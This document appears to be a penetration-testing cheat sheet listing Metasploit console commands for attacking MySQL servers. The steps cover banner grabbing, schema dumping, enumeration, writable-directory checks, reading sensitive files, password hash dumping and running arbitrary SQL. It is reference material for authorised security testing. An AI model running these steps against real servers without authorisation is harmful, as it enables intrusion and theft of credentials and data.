# Metasploit

## 01 - Banner Grab

```
msf > use auxiliary/scanner/mysql/mysql_version

msf auxiliary(scanner/mysql/mysql_version) > options

Module options (auxiliary/scanner/mysql/mysql_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    3306             yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)

msf auxiliary(scanner/mysql/mysql_version) > set rhosts <IP>

msf auxiliary(scanner/mysql/mysql_version) > set threads 2

msf auxiliary(scanner/mysql/mysql_version) > run
```

TODO: Re-arrange from this section to post exploitation under **Enumeration and Discovery**

## 02 - Database

### 2.1 - Schema

```
msf > use auxiliary/scanner/mysql/mysql_schemadump

msf auxiliary(scanner/mysql/mysql_schemadump) > options

Module options (auxiliary/scanner/mysql/mysql_schemadump):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   DISPLAY_RESULTS  true             yes       Display the Results to the Screen
   PASSWORD                          no        The password for the specified username
   RHOSTS                            yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT            3306             yes       The target port (TCP)
   THREADS          1                yes       The number of concurrent threads (max one per host)
   USERNAME                          no        The username to authenticate as

msf auxiliary(scanner/mysql/mysql_schemadump) > set rhosts <IP>

msf auxiliary(scanner/mysql/mysql_schemadump) > set threads 2

msf auxiliary(scanner/mysql/mysql_schemadump) > set username <username>

msf auxiliary(scanner/mysql/mysql_schemadump) > set password <password>

msf auxiliary(scanner/mysql/mysql_schemadump) > run
```

### 2.2 - Enumerate Instance

```
msf > use auxiliary/admin/mysql/mysql_enum

msf auxiliary(admin/mysql/mysql_enum) > options

Module options (auxiliary/admin/mysql/mysql_enum):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     3306             yes       The target port (TCP)
   USERNAME                   no        The username to authenticate as

msf auxiliary(admin/mysql/mysql_enum) > set rhosts <IP>

msf auxiliary(admin/mysql/mysql_enum) > set username <username>

msf auxiliary(admin/mysql/mysql_enum) > set password <password>

msf auxiliary(admin/mysql/mysql_enum) > run
```

### 2.3 - Writable Directory

```
msf > use auxiliary/scanner/mysql/mysql_writable_dirs

msf auxiliary(scanner/mysql/mysql_writable_dirs) > options

Module options (auxiliary/scanner/mysql/mysql_writable_dirs):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DIR_LIST                    yes       List of directories to test
   FILE_NAME  vDXcsdmE         yes       Name of file to write
   PASSWORD                    no        The password for the specified username
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      3306             yes       The target port (TCP)
   THREADS    1                yes       The number of concurrent threads (max one per host)
   USERNAME   root             yes       The username to authenticate as

msf auxiliary(scanner/mysql/mysql_writable_dirs) > set rhosts <IP>

msf auxiliary(scanner/mysql/mysql_writable_dirs) > set file_name <file>

msf auxiliary(scanner/mysql/mysql_writable_dirs) > set threads 4

msf auxiliary(scanner/mysql/mysql_writable_dirs) > set dir_list </path/to/directory//>

msf auxiliary(scanner/mysql/mysql_writable_dirs) > set username <username>

msf auxiliary(scanner/mysql/mysql_writable_dirs) > set password <password>

msf auxiliary(scanner/mysql/mysql_writable_dirs) > run
```

### 2.4 - Enumerate Files

```
msf > use auxiliary/scanner/mysql/mysql_file_enum

msf auxiliary(scanner/mysql/mysql_file_enum) > options

Module options (auxiliary/scanner/mysql/mysql_file_enum):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   DATABASE_NAME  mysql            yes       Name of database to use
   FILE_LIST                       yes       List of directories to enumerate
   PASSWORD                        no        The password for the specified username
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          3306             yes       The target port (TCP)
   TABLE_NAME     seWmJUSI         yes       Name of table to use - Warning, if the table already exists its contents will be corrupted
   THREADS        1                yes       The number of concurrent threads (max one per host)
   USERNAME       root             yes       The username to authenticate as

msf auxiliary(scanner/mysql/mysql_file_enum) > set rhosts <IP>

msf auxiliary(scanner/mysql/mysql_file_enum) > set database_name <database>

msf auxiliary(scanner/mysql/mysql_file_enum) > set table_name <table>

msf auxiliary(scanner/mysql/mysql_file_enum) > set file_list </usr/share/metasplot-framework/data/wordlists/sensitive_files.txt | /opt/metasploit/data/wordlists/sensitive_files.txt>

msf auxiliary(scanner/mysql/mysql_file_enum) > set username <username>

msf auxiliary(scanner/mysql/mysql_file_enum) > set password <password>

msf auxiliary(scanner/mysql/mysql_file_enum) > run -j
```

### 2.5 - Hashdump

```
msf > use auxiliary/scanner/mysql/mysql_hashdump

msf auxiliary(scanner/mysql/mysql_hashdump) > options

Module options (auxiliary/scanner/mysql/mysql_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     3306             yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME                   no        The username to authenticate as

msf auxiliary(scanner/mysql/mysql_hashdump) > set rhosts <IP>

msf auxiliary(scanner/mysql/mysql_hashdump) > set threads 2

msf auxiliary(scanner/mysql/mysql_hashdump) > set username <username>

msf auxiliary(scanner/mysql/mysql_hashdump) > set password <password>

msf auxiliary(scanner/mysql/mysql_hashdump) > run
```

## 03 - SQL Queries

```
msf > use auxiliary/admin/mysql/mysql_sql

msf auxiliary(admin/mysql/mysql_sql) > options

Module options (auxiliary/admin/mysql/mysql_sql):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   PASSWORD                    no        The password for the specified username
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     3306              yes       The target port (TCP)
   SQL       select version()  yes       The SQL to execute.
   USERNAME                    no        The username to authenticate as

msf auxiliary(admin/mysql/mysql_sql) > set rhosts <IP>

msf auxiliary(admin/mysql/mysql_sql) > set sql <query_commands>

msf auxiliary(admin/mysql/mysql_sql) > set username <username>

msf auxiliary(admin/mysql/mysql_sql) > set password <password>

msf auxiliary(admin/mysql/mysql_sql) > run
```

---
## References

- [Yeahhub: MySQL Pentesting Metasploit Framework](https://www.yeahhub.com/mysql-pentesting-metasploit-framework/)